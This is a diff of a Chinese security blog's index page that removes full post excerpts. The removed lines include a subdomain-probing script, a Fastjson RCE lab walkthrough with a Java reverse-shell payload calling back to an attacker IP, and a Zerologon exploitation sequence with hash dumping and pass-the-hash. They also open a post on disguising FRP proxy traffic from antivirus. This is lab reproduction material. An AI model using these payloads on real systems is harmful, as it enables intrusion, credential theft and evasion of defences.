@@ -239,106 +239,9 @@
   <div class="article-entry" itemprop="articleBody">
     
     <p>一般在收集完资产过后，尤其是子域名较多的情况下，有时候hw甚至是上百的资产。这时候首先要对明面的资产做进一步的动作，一些无法访问的要放在后面。无论是SRC还是项目，Hvv都需要快速探测目标存活情况，由此写了个py脚本</p>
-<h2><span id="批量探测">批量探测</span></h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">import</span> threading
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> re
-
-http_url <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-https_url <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-threads1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-
-<span class="token comment" spellcheck="true"># 获取url</span>
-<span class="token keyword">def</span> <span class="token function">Get_urls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'url.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> url <span class="token keyword">in</span> f<span class="token punctuation">:</span>
-            <span class="token keyword">try</span><span class="token punctuation">:</span>
-                patt <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(.*?)://(.*?)\n'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>M<span class="token operator">|</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#匹配出相应协议和域名</span>
-                <span class="token keyword">if</span> patt<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'http'</span><span class="token punctuation">:</span>
-                    http_url<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-                <span class="token keyword">elif</span> patt<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'https'</span><span class="token punctuation">:</span>
-                    https_url<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#子域名挖掘的，不带协议的匹配不到</span>
-                url <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> url
-                http_url<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true"># 对url文件去重</span>
-<span class="token keyword">def</span> <span class="token function">Write_File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    line_seen <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'http.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> url <span class="token keyword">in</span> http_url<span class="token punctuation">:</span>
-            url <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
-            <span class="token keyword">if</span> url <span class="token operator">not</span> <span class="token keyword">in</span> line_seen<span class="token punctuation">:</span>
-                line_seen<span class="token punctuation">.</span>add<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'https.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> url <span class="token keyword">in</span> https_url<span class="token punctuation">:</span>
-            url <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span>
-            <span class="token keyword">if</span> url <span class="token operator">not</span> <span class="token keyword">in</span> line_seen<span class="token punctuation">:</span>
-                line_seen<span class="token punctuation">.</span>add<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">Get_Code</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    host <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
-    host <span class="token operator">=</span> url<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"http://"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
-    <span class="token string">"Host"</span><span class="token punctuation">:</span> host<span class="token punctuation">,</span>
-    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
-    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"</span><span class="token punctuation">,</span>
-    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="token punctuation">,</span>
-    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span class="token punctuation">,</span>
-    <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span>
-    <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
-    <span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span>
-    <span class="token string">"Content-Length"</span><span class="token punctuation">:</span> <span class="token string">"0"</span>
-    <span class="token punctuation">}</span>
-    <span class="token comment" spellcheck="true">#f1 = open('./result/200.txt','w+',encoding='utf-8')</span>
-    <span class="token comment" spellcheck="true">#f2 = open('./result/异常.txt','w+',encoding='utf-8')</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-        code <span class="token operator">=</span> r<span class="token punctuation">.</span>status_code
-        <span class="token keyword">if</span> code <span class="token operator">==</span> <span class="token number">200</span> <span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'\033[1;32m{url}  {code} \033[0m'</span><span class="token punctuation">)</span>
-        <span class="token keyword">elif</span> code <span class="token operator">!=</span> <span class="token number">200</span> <span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'\033[1;36m{url}  {code} \033[0m'</span><span class="token punctuation">)</span>
-    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"\033[1;31m此网站访问异常：{url}\033[0m"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">myThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> url <span class="token keyword">in</span> http_url<span class="token punctuation">:</span>
-        url <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将制表符回车去除</span>
-        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>
-            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Get_Code<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-        <span class="token punctuation">)</span>
-    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>
-        thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token comment" spellcheck="true">#time.sleep(1)</span>
-    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>
-        thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------进行HTTPS探测----------"</span><span class="token punctuation">)</span>
-    <span class="token comment" spellcheck="true">#https探测</span>
-    <span class="token keyword">for</span> url <span class="token keyword">in</span> https_url<span class="token punctuation">:</span>
-        url <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将制表符回车去除</span>
-        threads1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>
-            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Get_Code<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-        <span class="token punctuation">)</span>
-    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads1<span class="token punctuation">:</span>
-        thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token comment" spellcheck="true">#time.sleep(1)</span>
-    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads1<span class="token punctuation">:</span>
-        thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    Get_urls<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    Write_File<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    myThread<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"-------用时{end - start}s-------"</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>直接把收集到的子域名放在url.txt下后直接运行就好。代码糙的一，轻喷。。。</p>
-
+    
+    <a class="article-more-a" href="/2021/04/28/存货资产探测/#more">more >></a>
+    
     
 
     
@@ -624,11 +527,11 @@ threads1 <span class="token operator">=</span> <span class="token punctuation">[
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">提权</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
         		</li>
       		
 		</ul>
@@ -877,83 +780,20 @@ threads1 <span class="token operator">=</span> <span class="token punctuation">[
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2><span id="fastjson是什么">Fastjson是什么</span></h2><ul>
+    <h2 id="Fastjson是什么"><a href="#Fastjson是什么" class="headerlink" title="Fastjson是什么"></a>Fastjson是什么</h2><ul>
 <li><p><strong>Fastjson</strong>是阿里巴巴开源JSON解析库，他可以解析JSON格式的字符串。支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
 </li>
 <li><p><strong>Fastjson</strong>提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题。</p>
 </li>
 </ul>
-<h2><span id="复现">复现</span></h2><h3><span id="复现环境">复现环境</span></h3><ul>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul>
 <li>靶机  ：192.168.30.51</li>
 <li>攻击机：192.168.30.16</li>
 </ul>
 <p>RCE：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
-<h3><span id="探测能否利用">探测能否利用</span></h3><p>payload：</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span>
-    <span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"menghao"</span><span class="token punctuation">,</span>
-    <span class="token string">"age"</span><span class="token punctuation">:</span><span class="token number">12</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>如果Response返回了相应的结果即代表着参数被解析了，即可进行下一步。<br><img src="/images/15/1.png" alt></p>
-<p>探测目标机是否出网（dnslog）</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span>
-    <span class="token string">"zeo"</span><span class="token punctuation">:</span><span class="token punctuation">{</span>
-        <span class="token string">"@type"</span><span class="token punctuation">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>
-        <span class="token string">"val"</span><span class="token punctuation">:</span><span class="token string">"aaa.bcxmn7.dnslog.cn"</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/15/2.png" alt></p>
-<h3><span id="准备ldap服务">准备LDAP服务</span></h3><p><strong>将marshalsec-0.0.3-SNAPSHOT-all.jar文件和Exploit.java放在同一目录下</strong><br>在当前目录下运行LDAP服务,修改IP为当前这台服务器的IP</p>
-<pre class="line-numbers language-java"><code class="language-java">java <span class="token operator">-</span>cp marshalsec<span class="token operator">-</span><span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">3</span><span class="token operator">-</span>SNAPSHOT<span class="token operator">-</span>all<span class="token punctuation">.</span>jar marshalsec<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>LDAPRefServer http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">30.16</span><span class="token operator">:</span><span class="token number">1111</span><span class="token operator">/</span>#Exploit <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/15/3.png" alt></p>
-<h3><span id="准备web服务">准备Web服务</span></h3><p>在当前目录下使用python搭建Web服务</p>
-<pre class="line-numbers language-java"><code class="language-java">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">1111</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/15/4.png" alt></p>
-<h3><span id="修改exploit并编译成class文件">修改Exploit并编译成class文件</span></h3><p>修改Exploit.java中的反弹IP和端口（准备接收反弹SHELL的服务器IP和监听端口）</p>
-<p>Exploit.java</p>
-<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span>
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span>
-<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader<span class="token punctuation">;</span>
-
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token function">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
-        Process p <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/192.168.30.16/1888;cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        InputStream is <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        BufferedReader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        String line<span class="token punctuation">;</span>
-        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-
-        p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/15/5.png" alt></p>
-<p>编译Exploit.java</p>
-<pre class="line-numbers language-java"><code class="language-java">javac Exploit<span class="token punctuation">.</span>java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/15/6.png" alt></p>
-<h3><span id="使用exp获取shell">使用EXP获取Shell</span></h3><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">{</span>
-    <span class="token string">"name"</span><span class="token operator">:</span><span class="token punctuation">{</span>
-        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
-        <span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
-    <span class="token punctuation">}</span><span class="token punctuation">,</span>
-    <span class="token string">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>
-        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
-        <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://192.168.30.16:9999/Exploit"</span><span class="token punctuation">,</span>
-        <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
-    <span class="token punctuation">}</span>
-
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>静等shell<del>~</del>(复现时虚拟机ping不通物理机时关闭本机防火墙即可)<br><img src="/images/15/7.png" alt><br><img src="/images/15/8.png" alt></p>
-<h3><span id="burp-自动探测fastjson反序列化-脚本">Burp 自动探测Fastjson反序列化 脚本</span></h3><p><a href="https://github.com/Maskhe/FastjsonScan" target="_blank" rel="noopener">https://github.com/Maskhe/FastjsonScan</a></p>
-<p>在平时抓包时右键 Send FastjsonScan 即可探测是否存在。<br><img src="/images/15/9.png" alt></p>
-
+    
+    <a class="article-more-a" href="/2021/03/23/15/#more">more >></a>
+    
     
 
     
@@ -1049,37 +889,12 @@ threads1 <span class="token operator">=</span> <span class="token punctuation">[
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h2><span id="cve-2020-1472">CVE-2020-1472</span></h2><blockquote>
+    <h2 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h2><blockquote>
 <p>2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。<br>攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。<br>对此，360CERT建议广大用户及时为各Windows Server操作系统安装最新相关补丁。与此同时，请做好资产自查以及预防工作，以免遭受黑客攻击。</p>
 </blockquote>
-<h2><span id="影响版本">影响版本</span></h2><pre class="line-numbers language-python"><code class="language-python">Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span>
-Windows Server <span class="token number">2008</span> R2 <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems Service Pack <span class="token number">1</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
-Windows Server <span class="token number">2012</span>
-Windows Server <span class="token number">2012</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
-Windows Server <span class="token number">2012</span> R2
-Windows Server <span class="token number">2012</span> R2 <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
-Windows Server <span class="token number">2016</span>
-Windows Server <span class="token number">2016</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
-Windows Server <span class="token number">2019</span>
-Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
-Windows Server<span class="token punctuation">,</span> version <span class="token number">1903</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
-Windows Server<span class="token punctuation">,</span> version <span class="token number">1909</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span>
-Windows Server<span class="token punctuation">,</span> version <span class="token number">2004</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2><span id="复现">复现</span></h2><p>EXP：<br><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/SecuraBV/CVE-2020-1472/" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472/</a></p>
-<p>靶机ip：192.168.21.109 （win server 2012 r2）</p>
-<h3><span id="首先在进入内网环境下获取到域控服务器的netbios名称">首先在进入内网环境下获取到域控服务器的NetBIOS名称</span></h3><pre class="line-numbers language-python"><code class="language-python">nbtstat <span class="token operator">-</span>A DC_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/14/1.png" alt></p>
-<h3><span id="检测目标是否能够利用此漏洞">检测目标是否能够利用此漏洞</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\zerologon_tester<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/14/2.png" alt></p>
-<h3><span id="将域控服务器中的机器账户密码打空">将域控服务器中的机器账户密码打空</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\cve<span class="token number">-2020</span><span class="token operator">-</span><span class="token number">1472</span><span class="token operator">-</span>exploit<span class="token punctuation">.</span>py DC <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/14/3.png" alt></p>
-<h3><span id="获取目标机器中所有用户的hash">获取目标机器中所有用户的hash</span></h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token punctuation">.</span>\secretsdump<span class="token punctuation">.</span>py de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>DC$@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span> <span class="token operator">-</span>no<span class="token operator">-</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/14/4.png" alt></p>
-<h3><span id="使用administrator用户登陆de1ay域">使用Administrator用户登陆de1ay域</span></h3><pre class="line-numbers language-python"><code class="language-python">python wmiexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span class="token punctuation">:</span><span class="token number">161cff084477fe596a5db81874498a24</span> de1ay<span class="token punctuation">.</span>com<span class="token operator">/</span>Administrator@<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">21.109</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/14/5.png" alt></p>
-<p>这个Hash也可解出来<br><img src="/images/14/6.png" alt><br><img src="/images/14/7.png" alt><br>后续恢复密码<br><a href="https://www.cnblogs.com/Yang34/p/13678632.html" target="_blank" rel="noopener">https://www.cnblogs.com/Yang34/p/13678632.html</a></p>
-<p>具体原理<br><a href="https://blog.csdn.net/smellycat000/article/details/108633744" target="_blank" rel="noopener">https://blog.csdn.net/smellycat000/article/details/108633744</a></p>
-
+    
+    <a class="article-more-a" href="/2020/12/01/14/#more">more >></a>
+    
     
 
     
@@ -1179,128 +994,10 @@ Windows Server<span class="token punctuation">,</span> version <span class="toke
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1><span id="前言">前言</span></h1><p>在拿下一台机器作为入口时，内网代理就变得尤为重要。他是我们进行横向渗透一个中间人，没了代理在内网中就寸步难行。而内网穿透的工具有很多，比如frp，reGeorg等等非常优秀的代理工具。使用方法不在赘述，这篇文章主要记录下在FRP内网代理时的流量改造。FRP作为一个开源的项目，它的特征早已被各大厂商掌握了，不进行流量上的改变我们就无法成功的建立连接，如果直接使用github编译后的EXE直接会被360等杀软直接判定为黑客行为，流量改造也是为了能够达到一定程度上的免杀效果。</p>
